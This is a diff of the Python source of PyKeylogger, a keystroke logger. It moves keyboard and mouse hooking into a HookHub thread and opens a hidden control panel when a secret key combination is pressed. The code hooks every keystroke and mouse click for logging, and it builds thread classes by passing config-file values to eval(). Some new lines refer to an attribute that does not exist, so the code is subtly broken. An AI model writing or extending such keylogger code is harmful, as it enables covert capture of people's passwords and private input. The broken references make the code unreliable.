@@ -33,12 +33,9 @@ else:
     print "OS is not recognised as windows or linux."
     exit()
 
-#import imp # don't need this anymore?
 import re
 from optparse import OptionParser
-import traceback
 import version
-#import ConfigParser
 from configobj import ConfigObj, flatten_errors
 from validate import Validator
 from controlpanel import PyKeyloggerControlPanel
@@ -64,7 +61,6 @@ class KeyLogger:
     def __init__(self):
         self.parse_options() # stored in self.cmdoptions
         self.parse_config_file() # stored in self.settings
-        self.parse_control_key()
         self.NagscreenLogic()
         self.process_settings()
         _settings['settings'] = self.settings
@@ -74,62 +70,25 @@ class KeyLogger:
         self.create_log_directory(self.settings['General']['Log Directory'])
         os.chdir(self.settings['General']['Log Directory'])
         self.create_loggers()
-        self.spawn_event_threads()
         
-        if os.name == 'posix':
-            self.hashchecker = ControlKeyMonitor(self,
-                                                 self.ControlKeyHash)
-        self.hm = hooklib.HookManager()
+        self.panel_trigger = threading.Lock()
         
-        if self.settings['General']['Hook Keyboard'] == True:
-            self.hm.HookKeyboard()
-            self.hm.KeyDown = self.OnKeyDownEvent
-            self.hm.KeyUp = self.OnKeyUpEvent
-        
-        if self.settings['General']['Hook Mouse'] == True:
-            self.hm.HookMouse()
-            self.hm.MouseAllButtonsDown = self.OnMouseDownEvent
-        
-        #if os.name == 'nt':
-        self.panel = False
-        
-        #if self.options.hookMouse == True:
-        #   self.hm.HookMouse()
-    
-    def spawn_event_threads(self):
-        self.event_threads = {}
-        self.queues = {}
-        self.logger.debug(self.settings.sections)
-        for section in self.settings.sections:
-            try:
-                threadname = self.settings[section]['General']['_Thread_Class']
-                self.queues[section] = Queue(0)
-                self.event_threads[section] = \
-                    eval(self.settings[section]['General']['_Thread_Class'] + \
-                    '(self.queues[section], section)')
-            except KeyError:
-                self.logger.debug('not creating thread for section %s' % \
-                                        section, exc_info=True)
-                pass # this is not a thread to be started.
+        self.hookhub = HookHub(self.panel_trigger)
     
     def start(self):
-        #self.lw.start()
-        #self.iw.start()
-        for key in self.event_threads.keys():
-            if self.settings[key]['General']['Enable ' + key]:
-                self.logger.debug('Starting thread %s: %s' % \
-                                (key, self.event_threads[key]))
-                self.event_threads[key].start()
-            else:
-                self.logger.debug('Not starting thread %s: %s' % \
-                                (key, self.event_threads[key]))
+        self.hookhub.start()
         
-        if os.name == 'nt':
-            pythoncom.PumpMessages()
-        if os.name == 'posix':
-            self.hashchecker.start()
-            self.hm.start()
-        
+        while True:
+            try:
+                self.panel_trigger.acquire()
+                self.logger.debug("Starting Control Panel")
+                self.control_key_hash.reset()
+                PyKeyloggerControlPanel()
+                self.panel_trigger.release()
+            except:
+                self.logger.exception("Some exception happened in the "
+                                        "control panel.")
+
     def process_settings(self):
         '''Sanitizes user input and detects full path of the log directory.
         
@@ -164,10 +123,7 @@ class KeyLogger:
         except:
             logging.getLogger('').error("error creating log directory", 
                         exc_info=True)
-    
-    def parse_control_key(self):
-        self.ControlKeyHash = \
-           ControlKeyHash(self.settings['General']['Control Key'])
+            sys.exit(1)
     
     def create_loggers(self):
     
@@ -199,57 +155,9 @@ class KeyLogger:
             
         self.logger = rootlogger
     
-    def push_event_to_queues(self, event):
-        for key in self.queues.keys():
-            self.logger.debug('Sticking event into queue %s' % key)
-            self.queues[key].put(event)
-    
-    def OnKeyDownEvent(self, event):
-        '''Called when a key is pressed.
-        
-           Puts the event in queue, updates the control key combo status,
-           and passes the event on to the system.
-           
-           '''
-        self.push_event_to_queues(event)
-        
-        self.ControlKeyHash.update(event)
-        
-        if self.cmdoptions.debug:
-            logging.getLogger('').debug("control key status: " + \
-                    str(self.ControlKeyHash))
-                
-        # We have to open the panel from main thread on windows, otherwise it
-        # hangs. This is possibly due to some interaction with the python
-        # message pump and tkinter.
-        # On linux, on the other hand, doing it from a separate worker thread
-        # is a must since the pyxhook module blocks until panel is closed,
-        # so we do it with the hashchecker thread instead.
-        if os.name == 'nt':
-            if self.ControlKeyHash.check():
-                if not self.panel:
-                    logging.getLogger('').debug("starting panel")
-                    self.panel = True
-                    self.ControlKeyHash.reset()
-                    PyKeyloggerControlPanel()
-        return True
-    
-    def OnKeyUpEvent(self,event):
-        self.ControlKeyHash.update(event)
-        return True
-    
-    def OnMouseDownEvent(self,event):
-        self.push_event_to_queues(event)
-        return True
-    
     def stop(self):
         '''Exit cleanly.'''
-        if os.name == 'posix':
-            self.hm.cancel()
-            self.hashchecker.cancel()
-        
-        for key in self.event_threads.keys():
-            self.event_threads[key].cancel()
+        self.hookhub.cancel()
         
         #print threading.enumerate()
         logging.shutdown()
@@ -368,6 +276,125 @@ class KeyLogger:
                 del(warn)
                 sys.exit()
 
+class HookHub(threading.Thread):
+    '''Sets the hooks and spawns the first-level event and logging threads.
+    
+    This is separated from the main (starter) thread for the following reason:
+    
+    On windows, Tk needs to be started from main thread, otherwise it hangs. 
+    This is possibly due to some interaction between the python message pump 
+    and Tkinter. 
+    On Linux, Tk needs to be started from a thread distinct from the hooking 
+    thread. That is the case because pyxhook blocks until GUI exits when we 
+    call it directly from a hook function.
+    
+    So, we move the actual hooking off the main thread, to satisfy both with 
+    the same code.
+    '''
+    
+    def __init__(self, panel_trigger):
+        threading.Thread.__init__(self)
+        
+        self.settings = _settings['settings']
+        self.cmdoptions = _cmdoptions['cmdoptions']
+        self.mainapp = _mainapp['mainapp']
+        
+        # create an empty logger - will just pass through to root logger.
+        self.logger = logging.getLogger('HookHub')
+        
+        self.parse_control_key()
+
+        self.spawn_event_threads()
+        
+        self.hashchecker = ControlKeyMonitor(self.control_key_hash, 
+                            self.panel_trigger)
+        self.hm = hooklib.HookManager()
+        
+        if self.settings['General']['Hook Keyboard'] == True:
+            self.hm.HookKeyboard()
+            self.hm.KeyDown = self.OnKeyDownEvent
+            self.hm.KeyUp = self.OnKeyUpEvent
+        
+        if self.settings['General']['Hook Mouse'] == True:
+            self.hm.HookMouse()
+            self.hm.MouseAllButtonsDown = self.OnMouseDownEvent
+        
+    def parse_control_key(self):
+        self.control_key_hash = \
+           ControlKeyHash(self.settings['General']['Control Key'])
+
+    def spawn_event_threads(self):
+        self.event_threads = {}
+        self.queues = {}
+        self.logger.debug(self.settings.sections)
+        for section in self.settings.sections:
+            try:
+                threadname = self.settings[section]['General']['_Thread_Class']
+                self.queues[section] = Queue(0)
+                self.event_threads[section] = \
+                    eval(self.settings[section]['General']['_Thread_Class'] + \
+                    '(self.queues[section], section)')
+            except KeyError:
+                self.logger.debug('not creating thread for section %s' % \
+                                        section, exc_info=True)
+                pass # this is not a thread to be started.
+
+    def OnKeyDownEvent(self, event):
+        '''Called when a key is pressed.
+        
+           Puts the event in queue, updates the control key combo status,
+           and passes the event on to the system.
+           
+           '''
+        self.push_event_to_queues(event)
+        self.control_key_hash.update(event)
+        return True
+    
+    def OnKeyUpEvent(self,event):
+        self.ControlKeyHash.update(event)
+        return True
+    
+    def OnMouseDownEvent(self,event):
+        self.push_event_to_queues(event)
+        return True
+
+    def push_event_to_queues(self, event):
+        for key in self.queues.keys():
+            self.logger.debug('Sticking event into queue %s' % key)
+            self.queues[key].put(event)
+
+    def start(self):
+        for key in self.event_threads.keys():
+            if self.settings[key]['General']['Enable ' + key]:
+                self.logger.debug('Starting thread %s: %s' % \
+                                (key, self.event_threads[key]))
+                self.event_threads[key].start()
+            else:
+                self.logger.debug('Not starting thread %s: %s' % \
+                                (key, self.event_threads[key]))
+        
+        self.hashchecker.start()
+        
+        if os.name == 'nt':
+            pythoncom.PumpMessages()
+        if os.name == 'posix':
+            self.hm.start()
+
+    def stop(self):
+        '''Exit cleanly.'''
+        self.hashchecker.cancel()
+        
+        if os.name == 'posix':
+            self.hm.cancel()
+        
+        for key in self.event_threads.keys():
+            self.event_threads[key].cancel()
+        
+        logging.shutdown()
+        time.sleep(0.2) # give all threads time to clean up
+        sys.exit()
+
+
 class ControlKeyHash:
     '''Encapsulates the control key dictionary.
        
@@ -376,25 +403,17 @@ class ControlKeyHash:
        
        '''
     def __init__(self, controlkeysetting):
-        
-        #~ lin_win_dict = {'Alt_L':'Lmenu',
-                                    #~ 'Alt_R':'Rmenu',
-                                    #~ 'Control_L':'Lcontrol',
-                                    #~ 'Control_R':'Rcontrol',
-                                    #~ 'Shift_L':'Lshift',
-                                    #~ 'Shift_R':'Rshift',
-                                    #~ 'Super_L':'Lwin',
-                                    #~ 'Super_R':'Rwin'}
+        self.cmdoptions = _cmdoptions['cmdoptions']
         
         lin_win_dict = {'Alt_l':'Lmenu',
-                                    'Alt_r':'Rmenu',
-                                    'Control_l':'Lcontrol',
-                                    'Control_r':'Rcontrol',
-                                    'Shift_l':'Lshift',
-                                    'Shift_r':'Rshift',
-                                    'Super_l':'Lwin',
-                                    'Super_r':'Rwin',
-                                    'Page_up':'Prior'}
+                        'Alt_r':'Rmenu',
+                        'Control_l':'Lcontrol',
+                        'Control_r':'Rcontrol',
+                        'Shift_l':'Lshift',
+                        'Shift_r':'Rshift',
+                        'Super_l':'Lwin',
+                        'Super_r':'Rwin',
+                        'Page_up':'Prior'}
                                     
         win_lin_dict = dict([(v,k) for (k,v) in lin_win_dict.iteritems()])
         
@@ -430,7 +449,11 @@ class ControlKeyHash:
         if event.MessageName == 'key up' and \
            event.Key.capitalize() in self.controlKeyHash.keys():
             self.controlKeyHash[event.Key.capitalize()] = False
-    
+            
+        if self.cmdoptions.debug:
+            logging.getLogger('').debug("control key status: " + \
+                    str(self.ControlKeyHash))
+
     def reset(self):
         for key in self.controlKeyHash.keys():
             self.controlKeyHash[key] = False
@@ -451,25 +474,25 @@ class ControlKeyMonitor(threading.Thread):
        Brings up control panel if it has.
        
        '''
-    def __init__(self, mainapp, controlkeyhash):
+    def __init__(self, control_key_hash, panel_trigger):
         threading.Thread.__init__(self)
         self.finished = threading.Event()
-        
-        # panel flag - true if panel is up, false if not
-        # this way we don't start a second panel instance when it's already up
-        #self.panel=False
-        
-        self.mainapp = mainapp
-        self.ControlKeyHash = controlkeyhash
+                
+        self.mainapp = _mainapp['mainapp']
+        self.control_key_hash = control_key_hash
+        self.panel_trigger = panel_trigger
+        self.panel_trigger.acquire()
         
     def run(self):
         while not self.finished.isSet():
-            if self.ControlKeyHash.check():
-                if not self.mainapp.panel:
-                    self.mainapp.panel = True
-                    self.ControlKeyHash.reset()
-                    PyKeyloggerControlPanel()
-            time.sleep(0.05)
+            if self.control_key_hash.check():
+                try:
+                    logging.getLogger('').debug("Triggering Control Panel")
+                    self.panel_trigger.release()
+                    time.sleep(0.05) # give panel chance to grab lock
+                    self.panel_trigger.acquire()
+                except RuntimeError:
+                    logging.getLogger('').debug("Looks like panel is already running.")
         
     def cancel(self):
         self.finished.set()
